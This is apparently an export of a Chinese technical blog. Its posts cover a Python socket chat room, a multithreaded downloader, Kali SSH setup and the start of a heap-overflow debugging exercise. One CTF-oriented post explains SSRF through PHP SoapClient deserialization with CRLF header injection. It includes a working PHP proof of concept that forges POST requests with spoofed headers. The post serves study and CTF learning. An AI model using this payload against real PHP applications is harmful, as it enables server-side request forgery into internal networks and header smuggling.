<li><strong>read_client()</strong> 函数用来不断读取客户端发送的数据，同时捕获异常。</li>
<li><strong>server_target()</strong> 函数作为线程的执行体，采用循环不断地从socket中读取客户端发送过来的数据，然后遍历 socket_list 向每个客户端进行广播。</li>
<li>主线程则负责建立通信，同时每当与一个客户端建立通信，就将其加入到 socket_list 中，并启动一个线程为其服务。</li>
</ul>
<h6 id="（2）客户端"><a href="#（2）客户端" class="headerlink" title="（2）客户端"></a>（2）客户端</h6><ul>
<li>每个客户端需要两个线程，子线程的执行体<strong>read_server()</strong> 函数负责不断的读取来自服务端的数据，并打印出来。</li>
<li>主线程负责建立通信，同时接收用户在键盘的输入，将其发送给服务端。</li>
</ul>
<p><br></p>
<h3 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h3><h6 id="（1）服务端-1"><a href="#（1）服务端-1" class="headerlink" title="（1）服务端"></a>（1）服务端</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># 文件名：server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">socket_list = []</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.bind((<span class="string">'10.3.98.118'</span>, <span class="number">30000</span>))</span><br><span class="line">s.listen()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_client</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 接收客户端的数据</span></span><br><span class="line">        <span class="keyword">return</span> s.recv(<span class="number">2048</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 若有异常，说明连接失败，则删除该socket</span></span><br><span class="line">        print(str(addr) + <span class="string">' Left!'</span>)</span><br><span class="line">        socket_list.remove(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_target</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = read_client(s)</span><br><span class="line">            <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(content)</span><br><span class="line">            <span class="comment"># 将一个客户端发送过来的数据广播给其他客户端</span></span><br><span class="line">            <span class="keyword">for</span> client <span class="keyword">in</span> socket_list:</span><br><span class="line">                client.send((str(addr)+ <span class="string">' say: '</span> +content).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'Error!'</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    <span class="comment"># 每当有客户连接后，就将其加到socket列表中</span></span><br><span class="line">    socket_list.append(conn)</span><br><span class="line">    print(str(addr) + <span class="string">' Joined!'</span>)</span><br><span class="line">    <span class="comment"># 每当有客户连接后，就启动一个线程为其服务</span></span><br><span class="line">    threading.Thread(target=socket_target, args=(conn,)).start()</span><br></pre></td></tr></table></figure>
<h6 id="（2）客户端-1"><a href="#（2）客户端-1" class="headerlink" title="（2）客户端"></a>（2）客户端</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># 文件名：client.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">'10.3.98.118'</span>, <span class="number">30000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_server</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 子线程负责从服务端接受数据并打印</span></span><br><span class="line">        content = s.recv(<span class="number">2048</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        print(content)</span><br><span class="line">        </span><br><span class="line">threading.Thread(target=read_server, args=(s,)).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = input(<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">'exit'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 主线程负责将用户输入的数据发送到socket中</span></span><br><span class="line">    s.send(line.encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x03-运行结果"><a href="#0x03-运行结果" class="headerlink" title="0x03 运行结果"></a>0x03 运行结果</h3><p>（1）运行一个服务端，三个客户端，在服务端可以看到哪三个客户端进入了“聊天室”（这里用ip+端口号区分）。</p>
<p><img src="/2019/07/19/Python多线程socket模拟C-S多人聊天室/20190719202355674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>（2）三个客户端分别在各自的窗口输入，会在服务端及其他客户端上显示（并指出谁发出的消息）。</p>
<p><img src="/2019/07/19/Python多线程socket模拟C-S多人聊天室/20190719202556758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>（3）关闭两个客户端的连接，会在服务端上显示谁退出了“聊天室”。</p>
<p><img src="/2019/07/19/Python多线程socket模拟C-S多人聊天室/20190719202636611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现多线程下载脚本</title>
    <url>/2019/07/19/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>一个简单的多线程下载资源的Python脚本，主要实现部分包含两个类：</p>
<ul>
<li><p>Download类：包含<code>download()</code>和<code>get_complete_rate()</code>两种方法。</p>
<ul>
<li>download()方法种首先用 urlopen() 方法打开远程资源并通过 Content-Length获取资源的大小，然后计算每个线程应该下载网络资源的大小及对应部分，最后依次创建并启动多个线程来下载网络资源的指定部分。</li>
<li>get_complete_rate()则是用来返回已下载的部分占全部资源大小的比例，用来回显进度。</li>
</ul>
</li>
<li><p>ThreadDownload类：该线程类继承了threading.Thread类，包含了一个<code>run()</code>方法。</p>
<ul>
<li>run()方法主要负责每个线程读取网络数据并写入本地。</li>
</ul>
</li>
</ul>
<p><br></p>
<h3 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h3><h6 id="ThreadDownload-py"><a href="#ThreadDownload-py" class="headerlink" title="ThreadDownload.py:"></a>ThreadDownload.py:</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Download</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, link, file_path, thread_num)</span>:</span></span><br><span class="line">        <span class="comment"># 下载路径</span></span><br><span class="line">        self.link = link</span><br><span class="line">        <span class="comment"># 保存位置</span></span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        <span class="comment"># 使用多少线程</span></span><br><span class="line">        self.thread_num = thread_num</span><br><span class="line">        <span class="comment"># 初始化threads数组</span></span><br><span class="line">        self.threads = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(self)</span>:</span></span><br><span class="line">        req = Request(url=self.link, method=<span class="string">'GET'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Accept'</span>, <span class="string">'*/*'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Charset'</span>, <span class="string">'UTF-8'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Connection'</span>, <span class="string">'Keep-Alive'</span>)</span><br><span class="line">        f = urlopen(req)</span><br><span class="line">        <span class="comment"># 获取要下载的文件的大小</span></span><br><span class="line">        self.file_size = int(dict(f.headers).get(<span class="string">'Content-Length'</span>, <span class="number">0</span>))</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># 计算每个线程要下载的资源的大小</span></span><br><span class="line">        current_part_size = self.file_size // self.thread_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.thread_num):</span><br><span class="line">            <span class="comment"># 计算每个线程下载的开始位置</span></span><br><span class="line">            start_pos = i * current_part_size</span><br><span class="line">            <span class="comment"># 每个线程使用一个wb模式打开的文件进行下载</span></span><br><span class="line">            t = open(self.file_path, <span class="string">'wb'</span>)</span><br><span class="line">            t.seek(start_pos, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># 创建下载线程</span></span><br><span class="line">            td = ThreadDownload(self.link, start_pos, current_part_size, t)</span><br><span class="line">            self.threads.append(td)</span><br><span class="line">            td.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获下载的完成百分比</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_complete_rate</span><span class="params">(self)</span>:</span></span><br><span class="line">        sum_size = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.thread_num):</span><br><span class="line">            sum_size += self.threads[i].length</span><br><span class="line">        <span class="keyword">return</span> sum_size / self.file_size</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadDownload</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, link, start_pos, current_part_size, current_part)</span>:</span></span><br><span class="line">        super().__init__() </span><br><span class="line">        <span class="comment"># 下载路径</span></span><br><span class="line">        self.link = link</span><br><span class="line">        <span class="comment"># 当前线程的下载位置</span></span><br><span class="line">        self.start_pos = start_pos</span><br><span class="line">        <span class="comment"># 定义当前线程负责下载的文件大小</span></span><br><span class="line">        self.current_part_size = current_part_size</span><br><span class="line">        <span class="comment"># 当前文件需要下载的文件快</span></span><br><span class="line">        self.current_part = current_part</span><br><span class="line">        <span class="comment"># 定义该线程已经下载的字节数</span></span><br><span class="line">        self.length = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        req = Request(url = self.link, method=<span class="string">'GET'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Accept'</span>, <span class="string">'*/*'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Charset'</span>, <span class="string">'UTF-8'</span>)</span><br><span class="line">        req.add_header(<span class="string">'Connection'</span>, <span class="string">'Keep-Alive'</span>)</span><br><span class="line"></span><br><span class="line">        f = urlopen(req)</span><br><span class="line">        <span class="comment"># 跳过self.start_pos个字节，表明该线程只负责下载自己负责的那部分内容</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.start_pos):</span><br><span class="line">            f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 读取网络数据，并写入本地</span></span><br><span class="line">        <span class="keyword">while</span> self.length &lt; self.current_part_size:</span><br><span class="line">            data = f.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.current_part.write(data)</span><br><span class="line">            <span class="comment"># 累计该线程下载的总大小</span></span><br><span class="line">            self.length += len(data)</span><br><span class="line">        self.current_part.close()</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<h6 id="thread-download-master-py"><a href="#thread-download-master-py" class="headerlink" title="thread_download-master.py:"></a>thread_download-master.py:</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ThreadDownload <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_process</span><span class="params">(dl)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> dl.get_complete_rate() &lt; <span class="number">1</span>:</span><br><span class="line">        complete_rate = int(dl.get_complete_rate()*<span class="number">100</span>)  </span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'下载中···（已下载'</span> + str(complete_rate) + <span class="string">'%）'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:   </span><br><span class="line">        Link = input(<span class="string">'[+]'</span> + <span class="string">'Link: '</span>)</span><br><span class="line">        file_path = input(<span class="string">'[+]'</span> + <span class="string">'File Path: '</span>)</span><br><span class="line">        thread_number = input(<span class="string">'[+]'</span> + <span class="string">'Thread Number: '</span>)</span><br><span class="line">        thread_number = int(thread_number)</span><br><span class="line">        dl = Download(Link, file_path, thread_number)</span><br><span class="line">        dl.download()</span><br><span class="line">        print(<span class="string">'\n开始下载!'</span>)</span><br><span class="line">        show_process(dl)</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'下载中···（已下载'</span> + <span class="string">'100%)'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        print(<span class="string">'\n下载完成!'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">            print(<span class="string">'Parameter Setting Error'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
<p> <br></p>
<h3 id="0x03-运行结果"><a href="#0x03-运行结果" class="headerlink" title="0x03 运行结果"></a>0x03 运行结果</h3><p>下载歌曲《男孩》为例，下载到<code>./Download/</code>目录下并命名为<code>男孩.mp3</code>，设置5个线程：</p>
<p><img src="/2019/07/19/Python实现多线程下载脚本/20190719150546671.jpg" alt="在这里插入图片描述"></p>
<p><img src="/2019/07/19/Python实现多线程下载脚本/20190719150552968.jpg" alt="在这里插入图片描述"></p>
<p>下载成功：</p>
<p><img src="/2019/07/19/Python实现多线程下载脚本/20190719150711111.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SoapClient类进行SSRF+CRLF攻击</title>
    <url>/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>前一段时间在De1CTF中的ShellShellShell以及SUCTF的Upload labs2都涉及到了利用PHP的SoapClient类进行SSRF，因此在这里记录下。</p>
<p><br></p>
<h1 id="0x01-什么是Soap"><a href="#0x01-什么是Soap" class="headerlink" title="0x01 什么是Soap"></a>0x01 什么是Soap</h1><p>SOAP是webService三要素（SOAP、WSDL、UDDI）之一：</p>
<ul>
<li><p>WSDL 用来描述如何访问具体的接口。</p>
</li>
<li><p>UDDI用来管理，分发，查询webService。</p>
</li>
<li><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
</li>
</ul>
<p><br></p>
<h1 id="0x02-PHP中的SoapClient类"><a href="#0x02-PHP中的SoapClient类" class="headerlink" title="0x02 PHP中的SoapClient类"></a>0x02 PHP中的SoapClient类</h1><p>参考链接：<a href="https://www.php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure>
<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
<p><img src="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/20190906000607209.png" alt="在这里插入图片描述"></p>
<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。</p>
<p>我们可以设置第一个参数为<code>null</code>，然后第二个参数的<code>location</code>选项设置为<code>target_url</code>，如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://xxx.xxx.xxx"</span>,</span><br><span class="line">                                     <span class="string">'uri'</span>      =&gt; <span class="string">"123"</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的<code>__Call</code>方法，然后向<code>target_url</code>发送一个soap请求，并且<code>uri</code>选项是我们可控的地方。</p>
<p><br></p>
<h1 id="0x03-CRLF-Injection"><a href="#0x03-CRLF-Injection" class="headerlink" title="0x03 CRLF Injection"></a>0x03 CRLF Injection</h1><p>CRLF是”回车 + 换行”<code>(\r\n)</code>的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<p>参考链接：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a></p>
<p><br></p>
<h1 id="0x04-SSRF-CRLF攻击内网"><a href="#0x04-SSRF-CRLF攻击内网" class="headerlink" title="0x04 SSRF+CRLF攻击内网"></a>0x04 SSRF+CRLF攻击内网</h1><p>实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。</p>
<p>那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：</p>
<p><img src="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/20190906003122388.png" alt="在这里插入图片描述"></p>
<p>可以看到options参数中还有一个选项为<code>user_agent</code>，运行我们自己设置<code>User-Agent</code>的值。</p>
<p>当我们可以控制<code>User-Agent</code>的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用CRLF发送post请求最关键的地方。</p>
<p>最后给出wupco师傅的生成任意POST报文的POC:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://123.206.216.198/bbb.php'</span>;</span><br><span class="line">$post_string = <span class="string">'a=b&amp;flag=aaa'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<p>参考链接：</p>
<p><a href="https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89" target="_blank" rel="noopener">https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89</a></p>
<p><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>对Kali Linux进行SSH远程控制</title>
    <url>/2019/05/27/%E5%AF%B9Kali%20Linux%E8%BF%9B%E8%A1%8CSSH%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<p>默认情况下，Kali Linux2并没有开始SSH服务，如果要远程使用SSH服务连接到Kali还需要一定的设置。</p>
<p><br></p>
<p>1、首先打开SSH所在目录，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/ssh/</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>2、在这个文件夹中创建一个备份文件夹keys_backup，用来保存默认的密钥：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir keys_backup</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>3、使用如下命令将默认的密钥移动到keys_backup文件夹中。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv ssh_host_* keys_backup</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>4、使用如下命令重新创建一个新的密钥。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure openssh-server</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/20190527001528877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<p>5、修改<code>sshd_config</code>文件，该文件位于<code>/etc/ssh/sshd_config</code>，如下图：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gedit sshd_config</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/20190527001838540.png" alt="在这里插入图片描述"></p>
<p><br></p>
<p>6、接下来，在终端启动SSH服务，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/2019052700194696.png" alt="在这里插入图片描述"><br>如果像查看SSH服务运行状态，可以使用如下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/20190527002127279.png" alt="在这里插入图片描述"><br>可以看到SSH服务已经在22端口上运行起来了。</p>
<p><br></p>
<p>7、查看自己kali的ip地址。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/2019052700235545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<p>8、最后可以使用PuTTY来完成远程登陆。</p>
<p><img src="/2019/05/27/对Kali Linux进行SSH远程控制/20190527002556995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入账号和密码后即可远程控制你的kali，如下：<br><img src="/2019/05/27/对Kali Linux进行SSH远程控制/20190527002459885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>《0day安全》中的堆溢出利用调试</title>
    <url>/2020/05/13/0daySec-HeapDebug/</url>
    <content><![CDATA[<h3 id="0x01-堆的工作原理"><a href="#0x01-堆的工作原理" class="headerlink" title="0x01 堆的工作原理"></a>0x01 堆的工作原理</h3><p>实验环境:</p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows20000虚拟机</td>
<td>分配策略对操作系统非常敏感</td>
</tr>
<tr>
<td>编译器</td>
<td>Visual C++ 6.0</td>
<td>默认编译选项</td>
</tr>
<tr>
<td>编译选项</td>
<td>默认编译选项</td>
<td>VS2003/VS2005的GS选项将导致实验失败</td>
</tr>
<tr>
<td>build 版本</td>
<td>release</td>
<td>VS2003/VS2005的GS选项将导致实验失败</td>
</tr>
<tr>
<td>调试器</td>
<td>Ollydbg</td>
<td>需要配置Make OllyDbg just-in-time debugger选项</td>
</tr>
</tbody>
</table>
<p>调试代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to 